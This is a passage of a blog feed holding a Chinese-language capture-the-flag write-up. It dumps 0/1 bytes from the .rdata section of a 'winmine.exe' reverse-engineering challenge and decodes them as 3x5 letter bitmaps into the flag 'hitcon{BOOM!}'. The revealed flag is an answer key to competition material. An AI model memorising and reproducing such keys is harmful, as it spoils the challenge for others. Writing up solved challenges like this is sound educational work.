.rdata:00973BFE                 db    1
.rdata:00973BFF                 db    1
.rdata:00973C00                 db    0
.rdata:00973C01                 db    0
.rdata:00973C02                 db    1
.rdata:00973C03                 db    1
.rdata:00973C04                 db    1
.rdata:00973C05                 db    1
.rdata:00973C06                 db    1
.rdata:00973C07                 db    1
.rdata:00973C08                 db    1
.rdata:00973C09                 db    0
.rdata:00973C0A                 db    0
.rdata:00973C0B                 db    1
.rdata:00973C0C                 db    1
.rdata:00973C0D                 db    1
.rdata:00973C0E                 db    1
.rdata:00973C0F                 db    0
.rdata:00973C10                 db    0
.rdata:00973C11                 db    1
.rdata:00973C12                 db    0
.rdata:00973C13                 db    0
.rdata:00973C14                 db    1
.rdata:00973C15                 db    0
.rdata:00973C16                 db    0
.rdata:00973C17                 db    1
.rdata:00973C18                 db    0
.rdata:00973C19                 db    0
.rdata:00973C1A                 db    1
.rdata:00973C1B                 db    0
.rdata:00973C1C                 db    0
.rdata:00973C1D                 db    1
.rdata:00973C1E                 db    0
.rdata:00973C1F                 db    0
.rdata:00973C20                 db    1
.rdata:00973C21                 db    1
.rdata:00973C22                 db    1
.rdata:00973C23                 db    1
.rdata:00973C24                 db    1
.rdata:00973C25                 db    1
.rdata:00973C26                 db    1
.rdata:00973C27                 db    0
.rdata:00973C28                 db    1
.rdata:00973C29                 db    1
.rdata:00973C2A                 db    1
.rdata:00973C2B                 db    1
.rdata:00973C2C                 db    1
.rdata:00973C2D                 db    0
.rdata:00973C2E                 db    1
.rdata:00973C2F                 db    1
.rdata:00973C30                 db    0
.rdata:00973C31                 db    1
.rdata:00973C32                 db    1
.rdata:00973C33                 db    1
.rdata:00973C34                 db    1
.rdata:00973C35                 db    1
.rdata:00973C36                 db    0
.rdata:00973C37                 db    0
.rdata:00973C38                 db    1
.rdata:00973C39                 db    0
.rdata:00973C3A                 db    1
.rdata:00973C3B                 db    1
.rdata:00973C3C                 db    0
.rdata:00973C3D                 db    1
.rdata:00973C3E                 db    1
.rdata:00973C3F                 db    1
.rdata:00973C40                 db    1
.rdata:00973C41                 db    1
.rdata:00973C42                 db    1
.rdata:00973C43                 db    1
.rdata:00973C44                 db    0
.rdata:00973C45                 db    1
.rdata:00973C46                 db    0
.rdata:00973C47                 db    0
.rdata:00973C48                 db    1
.rdata:00973C49                 db    0
.rdata:00973C4A                 db    0
.rdata:00973C4B                 db    1
.rdata:00973C4C                 db    0
.rdata:00973C4D                 db    1
.rdata:00973C4E                 db    1
.rdata:00973C4F                 db    1
.rdata:00973C50                 db    1
.rdata:00973C51                 db    1
.rdata:00973C52                 db    1
.rdata:00973C53                 db    1
.rdata:00973C54                 db    0
.rdata:00973C55                 db    0
.rdata:00973C56                 db    1
.rdata:00973C57                 db    1
.rdata:00973C58                 db    1
.rdata:00973C59                 db    0
.rdata:00973C5A                 db    0
.rdata:00973C5B                 db    1
.rdata:00973C5C                 db    1
.rdata:00973C5D                 db    1
.rdata:00973C5E                 db    1
.rdata:00973C5F                 db    1
.rdata:00973C60                 db    0
.rdata:00973C61                 db    0
.rdata:00973C62                 db    1
.rdata:00973C63                 db    0
.rdata:00973C64                 db    0
.rdata:00973C65                 db    1
.rdata:00973C66                 db    1
.rdata:00973C67                 db    1
.rdata:00973C68                 db    1
.rdata:00973C69                 db    0
.rdata:00973C6A                 db    1
.rdata:00973C6B                 db    1
.rdata:00973C6C                 db    0
.rdata:00973C6D                 db    1
.rdata:00973C6E                 db    0
.rdata:00973C6F                 db    0
.rdata:00973C70                 db    0
.rdata:00973C71                 db    0
.rdata:00973C72                 db    1
.rdata:00973C73                 db    0
.rdata:00973C74                 db    0
.rdata:00973C75                 db    0
.rdata:00973C76                 db    0
.rdata:00973C77                 db    0
.rdata:00973C78                 db    1
.rdata:00973C79                 db    0
.rdata:00973C7A                 db    0
.rdata:00973C7B                 db    1
.rdata:00973C7C                 db    0
.rdata:00973C7D                 db    0
.rdata:00973C7E                 db    0
.rdata:00973C7F                 db    0
.rdata:00973C80                 db    0
.rdata:00973C81                 db    1
.rdata:00973C82                 db    0
.rdata:00973C83                 db    1
.rdata:00973C84                 db    1
.rdata:00973C85                 db    1
.rdata:00973C86                 db    0
.rdata:00973C87                 db    1
.rdata:00973C88                 db    0
.rdata:00973C89                 db    0
.rdata:00973C8A                 db    1
.rdata:00973C8B                 db    0
.rdata:00973C8C                 db    0
.rdata:00973C8D                 db    0
.rdata:00973C8E                 db    0
.rdata:00973C8F                 db    0
.rdata:00973C90                 db    0
.rdata:00973C91                 db    0
.rdata:00973C92                 db    1
.rdata:00973C93                 db    1
.rdata:00973C94                 db    1
.rdata:00973C95                 db    1
.rdata:00973C96                 db    0
.rdata:00973C97                 db    0
.rdata:00973C98                 db    1
.rdata:00973C99                 db    1
.rdata:00973C9A                 db    1
.rdata:00973C9B                 db    0
.rdata:00973C9C                 db    0
.rdata:00973C9D                 db    0
.rdata:00973C9E                 db    0
.rdata:00973C9F                 db    0
.rdata:00973CA0                 db    0
.rdata:00973CA1                 db    1
.rdata:00973CA2                 db    1
.rdata:00973CA3                 db    1
.rdata:00973CA4                 db    1
.rdata:00973CA5                 db    0
.rdata:00973CA6                 db    1
.rdata:00973CA7                 db    1
.rdata:00973CA8                 db    1
.rdata:00973CA9                 db    1
.rdata:00973CAA                 db    0
.rdata:00973CAB                 db    0
.rdata:00973CAC                 db    0
.rdata:00973CAD                 db    0
.rdata:00973CAE                 db    0
.rdata:00973CAF                 db    0
.rdata:00973CB0                 db    1
.rdata:00973CB1                 db    1
.rdata:00973CB2                 db    0
.rdata:00973CB3                 db    1
.rdata:00973CB4                 db    0
.rdata:00973CB5                 db    1
.rdata:00973CB6                 db    1
.rdata:00973CB7                 db    0
.rdata:00973CB8                 db    1
.rdata:00973CB9                 db    0
.rdata:00973CBA                 db    1
.rdata:00973CBB                 db    1
.rdata:00973CBC                 db    0
.rdata:00973CBD                 db    1
.rdata:00973CBE                 db    0
.rdata:00973CBF                 db    1
.rdata:00973CC0                 db    1
.rdata:00973CC1                 db    0
.rdata:00973CC2                 db    0
.rdata:00973CC3                 db    1
.rdata:00973CC4                 db    0
.rdata:00973CC5                 db    0
.rdata:00973CC6                 db    1
.rdata:00973CC7                 db    1
.rdata:00973CC8                 db    1
.rdata:00973CC9                 db    1
.rdata:00973CCA                 db    0
.rdata:00973CCB                 db    1
.rdata:00973CCC                 db    0
.rdata:00973CCD                 db    1
.rdata:00973CCE                 db    1
.rdata:00973CCF                 db    1
.rdata:00973CD0                 db    1
.rdata:00973CD1                 db    1
.rdata:00973CD2                 db    0
.rdata:00973CD3                 db    1
.rdata:00973CD4                 db    1
.rdata:00973CD5                 db    1
.rdata:00973CD6                 db    1
.rdata:00973CD7                 db    1
.rdata:00973CD8                 db    1
.rdata:00973CD9                 db    1
.rdata:00973CDA                 db    1
.rdata:00973CDB                 db    0
.rdata:00973CDC                 db    1
.rdata:00973CDD                 db    1
.rdata:00973CDE                 db    0
.rdata:00973CDF                 db    1
.rdata:00973CE0                 db    1
.rdata:00973CE1                 db    0
.rdata:00973CE2                 db    1
.rdata:00973CE3                 db    1
.rdata:00973CE4                 db    1
.rdata:00973CE5                 db    1
.rdata:00973CE6                 db    1
.rdata:00973CE7                 db    1
.rdata:00973CE8                 db    1
.rdata:00973CE9                 db    1
.rdata:00973CEA                 db    0
.rdata:00973CEB                 db    1
.rdata:00973CEC                 db    1
.rdata:00973CED                 db    0
.rdata:00973CEE                 db    1
.rdata:00973CEF                 db    1
.rdata:00973CF0                 db    0
.rdata:00973CF1                 db    1
.rdata:00973CF2                 db    1
.rdata:00973CF3                 db    1
.rdata:00973CF4                 db    1
.rdata:00973CF5                 db    1
.rdata:00973CF6                 db    0
.rdata:00973CF7                 db    1
.rdata:00973CF8                 db    1
.rdata:00973CF9                 db    1
.rdata:00973CFA                 db    1
.rdata:00973CFB                 db    1
.rdata:00973CFC                 db    0
.rdata:00973CFD                 db    1
.rdata:00973CFE                 db    1
.rdata:00973CFF                 db    0
.rdata:00973D00                 db    1
.rdata:00973D01                 db    1
.rdata:00973D02                 db    0
.rdata:00973D03                 db    1
.rdata:00973D04                 db    0
.rdata:00973D05                 db    1
.rdata:00973D06                 db    0
.rdata:00973D07                 db    0
.rdata:00973D08                 db    1
.rdata:00973D09                 db    0
.rdata:00973D0A                 db    0
.rdata:00973D0B                 db    1
.rdata:00973D0C                 db    0
.rdata:00973D0D                 db    0
.rdata:00973D0E                 db    0
.rdata:00973D0F                 db    0
.rdata:00973D10                 db    0
.rdata:00973D11                 db    1
.rdata:00973D12                 db    0
.rdata:00973D13                 db    1
.rdata:00973D14                 db    1
.rdata:00973D15                 db    0
.rdata:00973D16                 db    0
.rdata:00973D17                 db    1
.rdata:00973D18                 db    0
.rdata:00973D19                 db    0
.rdata:00973D1A                 db    1
.rdata:00973D1B                 db    1
.rdata:00973D1C                 db    0
.rdata:00973D1D                 db    1
.rdata:00973D1E                 db    0
.rdata:00973D1F                 db    1
.rdata:00973D20                 db    1
.rdata:00973D21                 db    0
.rdata:00973D22                 db    0
.rdata:00973D23                 db    0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;將每 15 個字為一組，其中 3 個為一行的排法，排出第一個字為&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;111
010
010
010
010
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;看起來就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;T&lt;/code&gt;，那麼將 22 個字解完就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;THE FLAG is hitcon{BOOM!}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;如果出題者對這些字做 XOR 就比較困難了，好險好險&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;最後我們拿了第一名，感謝 Lazyhacker 、HITCON CMT 籌備團隊、mini wargame 出題者以及幫助過我的人&lt;/p&gt;

&lt;p&gt;後記: 結束後，跟 &lt;code class=&quot;highlighter-rouge&quot;&gt;d3vc0r3&lt;/code&gt; 交流，得知 Web 滲透測試專家對於 Reverse 題 &lt;code class=&quot;highlighter-rouge&quot;&gt;winmine.exe&lt;/code&gt; 的解法相當可愛，每猜中一個字，就利用 VMware 做 snapshot，如此一來，就可以輕鬆快樂的猜下一個字了，真是太睿智XD　&lt;/p&gt;
</content>
 </entry>
 

</feed>
